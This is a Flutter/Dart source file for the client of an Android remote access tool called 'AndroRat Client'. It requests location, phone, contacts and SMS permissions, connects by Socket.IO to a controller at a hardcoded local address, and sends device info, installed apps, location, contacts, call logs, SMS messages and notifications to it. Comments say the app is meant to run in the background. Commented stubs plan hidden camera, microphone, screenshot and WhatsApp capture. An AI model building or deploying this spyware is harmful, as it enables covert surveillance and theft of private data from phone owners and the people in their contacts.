import 'package:flutter/foundation.dart';
import 'package:flutter/material.dart';
import 'package:flutter_workspace/andro_rat/call_logs.dart';
import 'package:flutter_workspace/andro_rat/carrier_metrics.dart';
import 'package:flutter_workspace/andro_rat/contacts.dart';
import 'package:flutter_workspace/andro_rat/debug.dart';
import 'package:flutter_workspace/andro_rat/device_apps.dart';
import 'package:flutter_workspace/andro_rat/device_info.dart';
import 'package:flutter_workspace/andro_rat/device_location.dart';
import 'package:flutter_workspace/andro_rat/device_notifications.dart';
import 'package:flutter_workspace/andro_rat/network_metrics.dart';
import 'package:flutter_workspace/andro_rat/sms_messages.dart';
import 'package:notification_reader/notification_reader.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:socket_io_client/socket_io_client.dart' as SocketIO;

const hostUrl = "http://192.168.1.140:6275";
// const hostUrl = "http://192.168.0.101:6275";

void main() {
  runApp(AndroRatClient());
}

/// Client Application is s mainly background-based process!
/// Do not worry about fancy designs here, no dialogs, not even a SnackBar.
///
/// This UI/UX is only meant for "first-run" - should never be shown after a complete setup.
/// Unless otherwise impl., application is to run (and be able to re-run) in background.
///
/// Purpose of this activity/interaction is to grant the app all necessary permissions.
class AndroRatClient extends StatelessWidget {
  static const appName = "AndroRat Client";

  AndroRatClient({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: appName,
      home: Homepage(),
    );
  }
}

class Homepage extends StatefulWidget {
  Homepage({super.key});

  @override
  State<Homepage> createState() {
    return _HomepageState();
  }
}

class _HomepageState extends State<Homepage> {
  SocketIO.Socket? _socket;
  bool _connecting = false;
  String? _connectError, _status;
  final DeviceInfo _deviceInfo = DeviceInfo();
  final DeviceApps _deviceApps = DeviceApps();
  final NetworkMetrics _networkMetrics = NetworkMetrics();
  final DeviceLocation _deviceLocation = DeviceLocation();
  final CarrierMetrics _carrierMetrics = CarrierMetrics();
  final DeviceContacts _deviceContacts = DeviceContacts();
  final CallLogs _callLogs = CallLogs();
  final SMSMessages _smsMessages = SMSMessages();
  final DeviceNotifications _deviceNotifications = DeviceNotifications();
  final hostAddressFieldController = TextEditingController();

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addPostFrameCallback((timeStamp) async {
      final Map<Permission, PermissionStatus> permissions = await [
        Permission.location,
        Permission.locationAlways,
        Permission.phone,
        Permission.contacts,
        Permission.sms,
      ].request();
      Debug.log(permissions);
    });
    if (kDebugMode) {
      hostAddressFieldController.text = hostUrl;
    }
  }

  void _initSocket(String url) {
    _socket = SocketIO.io(url, {
      "autoConnect": false,
      "transports": ["websocket"],
    });

    _socket?.onConnect((_) async {
      Debug.log('[Connected]');
      // Debug.log("_");
      Debug.log("[Joining Device]:");
      var info = await _deviceInfo.getPayload();
      // Debug.log(info);
      Debug.log(info["id"]);
      _socket?.emit("clientJoin", info);
      setState(() {
        _connecting = false;
      });
      Debug.log(":[End Joining Device]");
    });

    _socket?.onConnectError((err) {
      Debug.log("[Connect Error]");
      Debug.log(err);
      setState(() {
        _connectError = "$err";
      });
    });

    _socket?.onError((err) {
      Debug.log("[Error]");
      Debug.log(err);
    });

    _socket?.onDisconnect((_) {
      Debug.log("[Disconnected]");
      // Debug.log(_);
      setState(() {
        _connecting = true; // Auto-reconnecting on disconnect...
      });
    });

    _addEvents();

    _socket?.connect();
  }

  void _addEvents() {
    _deviceInfo.registerEvents(_socket!);
    _deviceApps.registerEvents(_socket!);
    _networkMetrics.registerEvents(_socket!);
    _deviceLocation.registerEvents(_socket!);
    _carrierMetrics.registerEvents(_socket!);
    _callLogs.registerEvents(_socket!);
    _deviceContacts.registerEvents(_socket!);
    _smsMessages.registerEvents(_socket!);
    _deviceNotifications.registerEvents(_socket!);
  }

  // Todo refer
  Widget _actionTile(String title, Function()? callback) {
    return Container(
      // alignment: Alignment.center,
      // margin: EdgeInsets.symmetric(vertical: 16),
      child: ElevatedButton(
        onPressed: callback,
        child: Text(title),
      ),
    );
  }

  @override
  Widget build(BuildContext context) {
    final Widget initView = Column(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Container(
          margin: EdgeInsets.symmetric(vertical: 16),
          child: Column(
            children: [
              TextFormField(
                decoration: InputDecoration(
                  border: OutlineInputBorder(),
                  hintText: 'Enter host url',
                ),
                controller: hostAddressFieldController,
              ),
              Padding(
                padding: EdgeInsets.only(top: 16),
                child: ElevatedButton(
                  onPressed: () {
                    final url = hostAddressFieldController.text;
                    if (url.isNotEmpty) {
                      _initSocket(url);
                      setState(() {
                        _connectError = null;
                        _connecting = true;
                      });
                    }
                  },
                  child: Text("Connect"),
                ),
              ),
            ],
          ),
        ),
        // Text(_connectError ?? "", style: TextStyle(color: Colors.red)),
      ],
    );

    final Widget connectingView = Column(
      mainAxisAlignment: MainAxisAlignment.spaceBetween,
      children: [
        Container(
          // margin: EdgeInsets.only(bottom: 64),
          child: CircularProgressIndicator(),
        ),
        Container(
          // margin: EdgeInsets.only(bottom: 32),
          child: OutlinedButton(
            onPressed: () {
              _socket?.dispose();
              setState(() {
                _connecting = false;
              });
            },
            child: Text("Cancel"),
          ),
        ),
        Text(_connectError ?? "", style: TextStyle(color: Colors.red)),
      ],
    );

    final connectedView = Column(
      mainAxisAlignment: MainAxisAlignment.center,
      children: [
        _actionTile("Send Device Info", () async {
          await _deviceInfo.sendPayload();
        }),
        _actionTile("Send Installed Apps", () async {
          _deviceApps.sendPayload();
        }),
        _actionTile("Send Network Metrics", () async {
          _networkMetrics.sendPayload();
        }),
        _actionTile("Send Device Location", () async {
          _deviceLocation.sendPayload();
        }),
        _actionTile("Send Carrier Metrics", () async {
          _carrierMetrics.sendPayload();
        }),
        _actionTile("Send Contacts", () async {
          await _deviceContacts.sendPayload();
        }),
        _actionTile("Send Call Log", () async {
          _callLogs.sendPayload();
        }),
        _actionTile("Send SMS Messages", () async {
          _smsMessages.sendPayload();
        }),
        // _actionTile("Take/Send Screenshot", () async {
        // }),
        // _actionTile("Take/Send Front Picture", () async {
        // }),
        // _actionTile("Take/Send Back Picture", () async {
        // }),
        // _actionTile("Take/Send Voice Record", () async {
        // }),
        // _actionTile("Send WhatsApp Messages", () async {
        // }),
        _actionTile("Read/Send Notifications", () async {
          _deviceNotifications.sendPayload();
        }),
      ],
    );

    // Todo refer
    final Widget disconnectedView = initView;

    var view = initView;
    if (_socket?.connected ?? false) {
      view = connectedView;
    } else if (_connecting) {
      view = connectingView;
    } else if (_socket?.disconnected ?? false) {
      view = disconnectedView;
    }

    return Scaffold(
      appBar: AppBar(
        title: Text(AndroRatClient.appName),
      ),
      body: Container(
        alignment: Alignment.center,
        padding: EdgeInsets.all(16),
        child: view,
      ),
    );
  }
}
